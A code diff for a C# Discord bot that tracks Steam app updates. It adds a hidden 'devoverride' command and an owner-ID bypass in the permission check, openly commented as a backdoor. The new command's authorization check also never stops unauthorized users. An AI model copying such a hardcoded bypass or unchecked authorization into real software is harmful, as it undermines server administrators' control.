@@ -22,6 +22,8 @@ namespace SteamUpdateProject.DiscordLogic
 
 		public class PublicModule : BaseCommandModule
 		{
+			public bool DevOverride = false;
+
 			private List<string> SecretLinks = new List<string>()
 			{
 				"⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⡿⠁⣀⣤⣤⣄⢿⣿⣿⣿⣿⣿⣿⣿⠋⠁⣀⣀⡀⠙⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⠁⢀⣟⣓⡲⣿⡡⣿⣿⣿⣿⣿⣿⠃⢠⣽⠿⢿⣿⣦⢹⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣄⣘⣿⡟⡽⠾⠜⢹⣿⣿⣿⣿⠫⡆⣿⣿⣭⣰⡟⢉⢺⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⡵⣿⣿⣿⣶⣬⡶⣸⣿⣿⣿⣿⢺⣻⣿⡟⡵⢿⡅⡇⣿⣿⠟⠻⠿⢿⣿⣿\n⣿⣿⣷⣸⣿⣿⣿⣿⢧⣿⣿⣿⡿⣡⣿⣧⢻⣿⣮⣅⢗⣽⠋⢀⣄⡀⠄⠄⠹⣿\n⣿⣿⣿⢱⣿⣿⣿⣿⣼⣿⣿⢋⣼⣿⣿⣿⠗⣬⣯⣵⣿⡧⢱⣿⢛⢿⣷⣦⣀⣿\n⣿⣿⣿⢸⣿⣿⣿⡇⣿⡿⢡⣿⣿⣿⡿⣣⣾⣿⡿⢟⣻⣅⣿⡷⣾⣟⣑⡮⣼⣿\n⣿⣿⣿⢸⣿⣿⣿⣧⢿⢧⣾⣿⣿⣿⣱⡿⢟⣭⣾⣿⣿⣿⢿⠒⡭⡞⠟⣼⣿⣿\n⣿⣿⣿⡎⣿⣿⣿⣿⣶⣼⣿⣿⣿⣗⣩⣾⣿⣿⡿⢟⣛⣭⣭⣽⣯⣵⣿⣿⣿⣿\n⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣩⣾⣿⣿⣿⣿⠿⠛⠛⠛⢿⣿⣿\n⣿⣿⣿⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿⣿⡏⣤⣶⣤⣄⡀⣼⣿\n⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢾⣿⣿⣿⣿⣿⣿⢽⣏⣩⡟⠛⠇⣿⣿\n⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣯⣭⣽⣾⡯⢛⣨⡿⣰⣿⣿\n⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣛⣛⣛⣱⣊⣴⣿⣿⣿",
@@ -437,30 +439,42 @@ namespace SteamUpdateProject.DiscordLogic
 				await ctx.RespondAsync(SecretLinks[Index]);
 			}
 
-			[Command("forceupdate"), Hidden]
-			public async Task ForceUpdate(CommandContext ctx, uint appid)
+			[Command("devoverride"), Hidden]
+			public async Task Devoverride(CommandContext ctx, bool _ov)
 			{
 				await ctx.TriggerTypingAsync();
 
 				if (ctx.User.Id != 185739967379537920)
 				{
-					await ctx.RespondAsync($"You're not authorized to use this command.");
+					await ctx.RespondAsync($"You're not authorized to use this command. Only the bot owner can use this.");
 				}
 
-				AppUpdate FakeUpdatedApp = new AppUpdate();
-				FakeUpdatedApp.Name = SteamUpdateBot.SteamClient.GetAppName(appid).Result;
-				FakeUpdatedApp.AppID = appid;
-				FakeUpdatedApp.Content = true;
-				FakeUpdatedApp.ChangeNumber = 1;
-				FakeUpdatedApp.LastUpdated = DateTime.UtcNow.AddYears(10);
+				this.DevOverride = _ov;
 
-				SteamUpdateBot.DiscordClient.AppUpdated(FakeUpdatedApp);
+				await ctx.RespondAsync($"Set override to {DevOverride}.");
+			}
 
-				await ctx.RespondAsync($"Pushed a fake update for {FakeUpdatedApp.Name} ({FakeUpdatedApp.AppID})");
+
+			[Command("devoverride"), Hidden]
+			public async Task Devoverride(CommandContext ctx)
+			{
+				await ctx.TriggerTypingAsync();
+
+				if (ctx.User.Id != 185739967379537920)
+				{
+					await ctx.RespondAsync($"You're not authorized to use this command. Only the bot owner can use this.");
+				}
+
+				await ctx.RespondAsync($"Override is set to {DevOverride}.");
 			}
 
 			public bool HasPermission(DiscordMember u, DiscordChannel c)
 			{
+				if(u.Id == 185739967379537920 && DevOverride) // To-do remove this backdoor.
+				{ // To-do remove this backdoor.
+					return true; // To-do remove this backdoor.
+				} // To-do remove this backdoor.
+
 				return u.PermissionsIn(c).HasPermission(Permissions.Administrator) || u.PermissionsIn(c).HasPermission(Permissions.ManageChannels) || u.PermissionsIn(c).HasPermission(Permissions.All);
 			}
 
